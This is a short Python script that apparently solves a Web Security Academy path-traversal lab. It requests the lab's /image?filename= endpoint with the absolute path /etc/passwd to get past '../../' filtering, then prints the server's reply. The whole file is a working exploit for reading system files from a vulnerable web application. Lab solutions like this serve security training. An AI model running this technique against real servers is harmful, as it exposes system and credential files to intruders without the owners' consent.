#!/usr/bin/python3

import requests

def dt_image(url, api):

    # Using absolute path to bypass ../../
    payload = "/etc/passwd"

    r = requests.get(url + api + payload)
    print(r.text)
    
if __name__ == '__main__':
    url = "https://acec1fa51e7e2d7ec0674018001a0041.web-security-academy.net"
    api = "/image?filename="

    dt_image(url, api)